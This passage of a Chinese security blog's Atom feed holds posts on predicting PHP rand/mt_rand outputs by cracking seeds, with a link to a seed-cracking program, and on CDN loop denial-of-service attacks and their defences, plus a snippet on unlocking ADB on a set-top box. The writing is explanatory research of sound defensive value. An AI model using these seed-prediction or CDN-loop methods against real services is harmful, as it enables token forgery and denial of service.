&lt;h2 id=&quot;ZTE机顶盒&quot;&gt;&lt;a href=&quot;#ZTE机顶盒&quot; class=&quot;headerlink&quot; title=&quot;ZTE机顶盒&quot;&gt;&lt;/a&gt;ZTE机顶盒&lt;/h2&gt;&lt;p&gt;第一次送的机顶盒是中兴的，有个现成的工具可以开启adb，直接搞定。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/downloads/liantong_zhongxing_pojie.rar&quot;&gt;工具下载&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;顺便提取出来的还有一些奇怪的网站，可以下到所有版本的固件，附后。&lt;br&gt;
    
    </summary>
    
      <category term="fun" scheme="http://5alt.me/categories/fun/"/>
    
    
  </entry>
  
  <entry>
    <title>php里的随机数</title>
    <link href="http://5alt.me/2017/06/php%E9%87%8C%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    <id>http://5alt.me/2017/06/php里的随机数/</id>
    <published>2017-06-11T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.785Z</updated>
    
    <content type="html"><![CDATA[<p>这次来填一个关于php随机数预测的坑。php5和php7中的随机数产生机制已经大有不同，本文将详细讲一讲这些区别和爆破种子的时候会产生的问题。</p><p>php中常用的随机数产生函数是<code>rand()</code>和<code>mt_rand()</code>。下面将针对这两个函数展开。<br><a id="more"></a></p><h2 id="php5-中的随机数"><a href="#php5-中的随机数" class="headerlink" title="php5 中的随机数"></a>php5 中的随机数</h2><h3 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h3><p>php5 中的<code>rand</code>函数调用的是<code>glibc</code>中的<code>random()</code>。其实现算法可以简化为如下代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> seed 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> r[MAX];</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  r[<span class="number">0</span>] = seed;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;<span class="number">31</span>; i++) &#123;</span><br><span class="line">    r[i] = (<span class="number">16807L</span>L * r[i<span class="number">-1</span>]) % <span class="number">2147483647</span>;</span><br><span class="line">    <span class="keyword">if</span> (r[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      r[i] += <span class="number">2147483647</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">31</span>; i&lt;<span class="number">34</span>; i++) &#123;</span><br><span class="line">    r[i] = r[i<span class="number">-31</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">34</span>; i&lt;<span class="number">344</span>; i++) &#123;</span><br><span class="line">    r[i] = r[i<span class="number">-31</span>] + r[i<span class="number">-3</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">344</span>; i&lt;MAX; i++) &#123;</span><br><span class="line">    r[i] = r[i<span class="number">-31</span>] + r[i<span class="number">-3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)r[i]) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，当前的随机数与之前第31个和之前第3个有关。因此只要获取了连续31个随机数，就有极大概率（输出的时候左移导致部分信息丢失）预测后面的随机数。</p><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand"></a>mt_rand</h3><p>php5的<code>mt_rand</code>函数实现的是一个错误版本的<code>MT19937</code>随机数生成算法。<br>在<code>twist</code>函数中有个地方把变量弄错了 =。 =</p><p>对php5的<code>mt_rand</code>的攻击就是根据几个随机数序列来爆破种子，然后推测出整个随机数的序列。工具是openwall的<code>php_mt_seed</code>。</p><p>值得一提的是，<code>mt_rand</code>可以指定随机数产生的范围<code>int mt_rand ( int $min , int $max )</code>。此时产生随机数的方式是用一个宏来处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAND_RANGE(__n, __min, __max, __tmax) \</span></span><br><span class="line">    (__n) = (__min) + (<span class="keyword">long</span>) ((<span class="keyword">double</span>) ( (<span class="keyword">double</span>) (__max) - (__min) + <span class="number">1.0</span>) * ((__n) / ((__tmax) + <span class="number">1.0</span>)))</span><br><span class="line">...</span><br><span class="line">number = (<span class="keyword">long</span>) (php_mt_rand(TSRMLS_C) &gt;&gt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">    RAND_RANGE(number, min, max, PHP_MT_RAND_MAX);</span><br><span class="line">&#125;</span><br><span class="line">RETURN_LONG(number);</span><br></pre></td></tr></table></figure><p>即用内置函数<code>php_mt_rand</code>产生的随机数进行乘除操作，得到位于合适范围的值。需要注意的是，无论<code>mt_rand</code>函数的调用带不带范围，其输出的结果与<code>php_mt_rand(TSRMLS_C) &gt;&gt; 1</code>有关。通过<code>mt_rand()</code>可以直接计算出<code>mt_rand(min, max)</code>来。</p><h2 id="php7-中的随机数"><a href="#php7-中的随机数" class="headerlink" title="php7 中的随机数"></a>php7 中的随机数</h2><h3 id="rand-1"><a href="#rand-1" class="headerlink" title="rand"></a>rand</h3><p>php7中的<code>rand</code>函数同<code>mt_rand</code>，<code>srand</code>同<code>mt_srand</code>。</p><h3 id="mt-rand-1"><a href="#mt-rand-1" class="headerlink" title="mt_rand"></a>mt_rand</h3><p>从 php 7.1.0 开始，<code>mt_rand</code>函数修复了之前对<code>MT19937</code>实现上的错误，但是仍然保留了错误版本的随机数生成方式。详情见<code>mt_srand</code>的文档。</p><blockquote><ul><li>MT_RAND_MT19937    Uses the fixed, correct, Mersenne Twister implementation, available as of PHP 7.1.0.</li><li>MT_RAND_PHP    Uses an incorrect Mersenne Twister implementation which was used as the default up till PHP 7.1.0. This mode is available for backward compatibility.</li></ul></blockquote><p>除了修复<code>twist</code>函数的问题之外，在产生一个范围的随机数的时候，php7和php5的行为也不一致。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argc == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// genrand_int31 in mt19937ar.c performs a right shift</span></span><br><span class="line">    RETURN_LONG(php_mt_rand() &gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">RETURN_LONG(php_mt_rand_common(min, max));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (BG(mt_rand_mode) == MT_RAND_MT19937) &#123;</span><br><span class="line">    <span class="keyword">return</span> php_mt_rand_range(min, max);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">umax++;</span><br><span class="line">...</span><br><span class="line">result = php_mt_rand();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> (zend_long)((result % umax) + min);</span><br></pre></td></tr></table></figure><p>根据代码我们可以看到，<code>mt_rand</code>函数不带范围的时候，输出的结果为<code>php_mt_rand() &gt;&gt; 1</code>；而带范围的时候，输出的结果为<code>(php_mt_rand() % (max-min+1)) + min</code>。通过<code>mt_rand()</code>不可以直接计算出<code>mt_rand(min, max)</code>，存在一些误差。</p><p>由于上述原因，之前用来爆破随机数种子的工具已经无法直接使用。我自己实现了一个<a href="/downloads/mt_rand.c">多线程爆破种子的c程序</a>，在4核2G内存的虚拟机上跑了大概4个小时才将种子遍历完毕。</p><h3 id="random-int-random-bytes"><a href="#random-int-random-bytes" class="headerlink" title="random_int / random_bytes"></a>random_int / random_bytes</h3><p>php7 提供了更加安全的随机数产生函数，<code>random_int</code>和<code>random_bytes</code>调用了系统的一些安全的随机数产生函数来输出。</p><blockquote><ul><li>On Windows, » CryptGenRandom() will always be used.</li><li>On Linux, the » getrandom(2) syscall will be used if available.</li><li>On other platforms, /dev/urandom will be used.</li><li>If none of the aforementioned sources are available, then an Exception will be thrown.</li></ul></blockquote><h2 id="php的运行模式对随机数产生的影响"><a href="#php的运行模式对随机数产生的影响" class="headerlink" title="php的运行模式对随机数产生的影响"></a>php的运行模式对随机数产生的影响</h2><h3 id="Apache2handler"><a href="#Apache2handler" class="headerlink" title="Apache2handler"></a>Apache2handler</h3><p>在<code>/sapi/apache2handler/sapi_apache2.c</code>中<code>static int php_handler(request_rec *r)</code>函数可以看到，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctx = SG(server_context);</span><br><span class="line">parent_req = ctx-&gt;r;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!parent_req) &#123;</span><br><span class="line">php_apache_request_dtor(r);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>只有在<code>parent_req</code>为<code>NULL</code>的情况下，才会运行到<code>php_apache_request_dtor</code>，调用<code>php_request_shutdown</code>，这个函数会调用注册的<code>PHP_RSHUTDOWN_FUNCTION</code>，导致随机数的种子被标记为未初始化。</p><p>在Apache下，一个 Connection 中的所有 request 都交给一个 Apache 的进程处理。很可能没有调用到<code>php_apache_request_dtor</code>导致在一个 Connection 中的请求共用一个种子。（未测试）</p><h3 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h3><p>在<code>/sapi/fpm/fpm/fpm_main.c</code>中<code>int main(int argc, char *argv[])</code>函数可以看到，<code>php-fpm</code>的进程会循环处理请求，请求结束后调用<code>php_request_shutdown</code>函数进行清理。因此，在<code>php-fpm</code>的环境下，每个请求用的都是一个新的种子。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.mscs.dal.ca/~selinger/random/" target="_blank" rel="noopener">http://www.mscs.dal.ca/~selinger/random/</a><br><a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">http://www.openwall.com/php_mt_seed/</a><br><a href="https://github.com/lt/PHP-MT19937/tree/master/lib" target="_blank" rel="noopener">https://github.com/lt/PHP-MT19937/tree/master/lib</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次来填一个关于php随机数预测的坑。php5和php7中的随机数产生机制已经大有不同，本文将详细讲一讲这些区别和爆破种子的时候会产生的问题。&lt;/p&gt;
&lt;p&gt;php中常用的随机数产生函数是&lt;code&gt;rand()&lt;/code&gt;和&lt;code&gt;mt_rand()&lt;/code&gt;。下面将针对这两个函数展开。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>CDN安全小结</title>
    <link href="http://5alt.me/2017/02/CDN%E7%8E%AF%E8%B7%AF%E6%94%BB%E5%87%BB/"/>
    <id>http://5alt.me/2017/02/CDN环路攻击/</id>
    <published>2017-02-06T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.784Z</updated>
    
    <content type="html"><![CDATA[<p>CDN作为反向代理服务器，除非操作系统或者反向代理软件爆出严重的漏洞，其本身是不存在较大的安全问题的。扫描CDN服务器的端口往往会发现只开了80(http)和443(https)，而这两个端口又不运行动态脚本，作为攻击者很难从这里下手。</p><p>尽管CDN服务器看起来固若金汤，但是攻击CDN可以从CDN运行逻辑入手。CDN安全主要出现在环路攻击上，一旦流量形成环，则整个CDN会带着流量不断消耗自身的资源，造成拒绝服务。</p><a id="more"></a><h2 id="CDN环路攻击"><a href="#CDN环路攻击" class="headerlink" title="CDN环路攻击"></a>CDN环路攻击</h2><p>设置CDN的时候有几个概念。</p><ul><li>加速域名</li><li>源站地址</li><li>CDN分配的动态解析域名</li></ul><p>加速域名是用户控制的域名，用户将加速域名提交到CDN系统，系统会自动分配一个动态解析域名。这个动态解析的域名会根据来源IP的地区以及CDN节点负载情况动态解析成CDN某个节点的IP。用户需要将加速域名的CNAME记录指向云服务分配的动态解析域名，这样当用户请求加速域名的时候，其对应的ip地址由动态解析域名进行解析。这样用户浏览器端的请求就会发送到CDN的一个节点上，然后由该节点向源站地址代理发出请求，得到响应之后返回给用户。</p><p>分析上面的过程，可以总结出CDN环路攻击有5种形式。</p><h3 id="CDN自身成环"><a href="#CDN自身成环" class="headerlink" title="CDN自身成环"></a>CDN自身成环</h3><p>将CDN的加速域名与源站域名设置成同一个，源站域名A记录指向CDN的一个节点。这样，当请求加速域名的时候，CDN节点解析到源站的IP为其自身的IP，循环自己请求自己，导致环路。</p><h3 id="CDN之间成环"><a href="#CDN之间成环" class="headerlink" title="CDN之间成环"></a>CDN之间成环</h3><p>将CDN的加速域名与源站域名设置成同一个，自己搭建DNS服务器，域名的NS记录指向自己的DNS服务器，即攻击者可以动态解析源站域名为需要的IP。根据CDN分配的动态解析域名可以得到多个绑定了该加速域名的CDN节点的IP，对每次加速域名的解析随机返回收集的CDN节点IP中的一个。这样，用户的HTTP请求的数据包就在CDN之间互相传递，如果控制好DNS解析的规律，则能形成一个环路，使数据包一直传递下去。</p><p>另外一种攻击方法是新建两个CDN加速域名，将源站指向对方，并通过动态解析域名的解析记录寻找两个加速域名的公共CDN节点的IP。搭建DNS服务器动态解析这两个域名，使其A记录随机返回公共IP里的一个。这样只要访问其中一个域名即可让流量在这些公共IP之间流动起来。</p><h3 id="不同CDN商之间成环"><a href="#不同CDN商之间成环" class="headerlink" title="不同CDN商之间成环"></a>不同CDN商之间成环</h3><p>如果CDN服务商对自身http包传递次数做了一些限制，而有的CDN商可以去除掉这些限制的话，可以考虑在不同CDN商之间将流量成环。</p><h3 id="CDN和源站成环"><a href="#CDN和源站成环" class="headerlink" title="CDN和源站成环"></a>CDN和源站成环</h3><p>如果能控制源站或者源站有SSRF的漏洞，正常配置CDN服务，把源站也变成一个反向代理服务器，地址指向CDN的一个节点。这样用户发起请求，CDN请求源站，源站又回过头来请求CDN。这样能较快的耗尽源站的资源，并且可能拖住一个CDN的节点。</p><h3 id="DNS-loop"><a href="#DNS-loop" class="headerlink" title="DNS loop"></a>DNS loop</h3><p>将a的CNAME记录设置成b，b的CNAME记录设置成c，c的CNAME记录设置成a。向CDN的一个节点发送请求a的数据包，则CDN会不断循环查询DNS，对DNS服务器造成较大的流量。</p><h2 id="CDN测试遇到的坑"><a href="#CDN测试遇到的坑" class="headerlink" title="CDN测试遇到的坑"></a>CDN测试遇到的坑</h2><p>在最开始测试CDN环路攻击的时候，新建了多个加速域名，把加速域名的源站设置成下一个加速域名，依次连接起来，然后把最后一个加速域名的源站设置成自己控制的服务器。在服务器上监听端口，请求第一个加速域名，却没有收到任何请求。这个问题纠结了很长时间，直到意识到在b加速域名的CDN节点上可能没有a加速域名的信息。这样从a到b的请求会被丢弃掉，导致无法将流量传递。</p><p>如果CDN允许配置回源host的话，那么CDN环路攻击依然可以生效。</p><h2 id="CDN环路攻击的解决方案"><a href="#CDN环路攻击的解决方案" class="headerlink" title="CDN环路攻击的解决方案"></a>CDN环路攻击的解决方案</h2><p>从攻击的方法上可以看到，阻止CDN的HTTP loop最简单的方法是禁止CDN的加速域名与源站域名设置成同一个。除此之外，实际上还需要做一些其他的防护手段来避免CDN之间成环。</p><p>阿里云会在HTTP请求头中加一个Via项，里面记录了这个请求经过的节点信息。如果节点检测到Via中和本节点的特征匹配的话，则直接返回<code>HTTP/1.1 508 Loop Detected</code>。经过测试发现阿里云会把多个的Via项拼起来，尝试干扰服务器对Via的判断没有成功。</p><p>通过Via来判断是一个比较好的解决思路，也是RFC中推荐的方法。有的CDN会在HTTP请求头里加一项特殊的<code>X-Daa-Tunnel: hop_count=1</code>头来计数，用户可以自己指定一个非常小的负数，CDN节点需要一点一点加很久才能达到阈值，导致仍然可以受到攻击。</p><p>解决好环路的判断问题是避免CDN流量转发放大造成DoS的根本。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="http://netsec.ccert.edu.cn/duanhx/files/2010/12/cdn_loop-final-camera-ready.pdf" target="_blank" rel="noopener">http://netsec.ccert.edu.cn/duanhx/files/2010/12/cdn_loop-final-camera-ready.pdf</a></li><li><a href="https://www.internetsociety.org/sites/default/files/04_2-ndss2016-slides.pdf" target="_blank" rel="noopener">https://www.internetsociety.org/sites/default/files/04_2-ndss2016-slides.pdf</a></li><li><a href="https://jiji262.github.io/wooyun_articles/drops/CDN%E6%B5%81%E9%87%8F%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.html" target="_blank" rel="noopener">https://jiji262.github.io/wooyun_articles/drops/CDN%E6%B5%81%E9%87%8F%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CDN作为反向代理服务器，除非操作系统或者反向代理软件爆出严重的漏洞，其本身是不存在较大的安全问题的。扫描CDN服务器的端口往往会发现只开了80(http)和443(https)，而这两个端口又不运行动态脚本，作为攻击者很难从这里下手。&lt;/p&gt;
&lt;p&gt;尽管CDN服务器看起来固若金汤，但是攻击CDN可以从CDN运行逻辑入手。CDN安全主要出现在环路攻击上，一旦流量形成环，则整个CDN会带着流量不断消耗自身的资源，造成拒绝服务。&lt;/p&gt;
    
    </summary>
    
      <category term="云安全" scheme="http://5alt.me/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
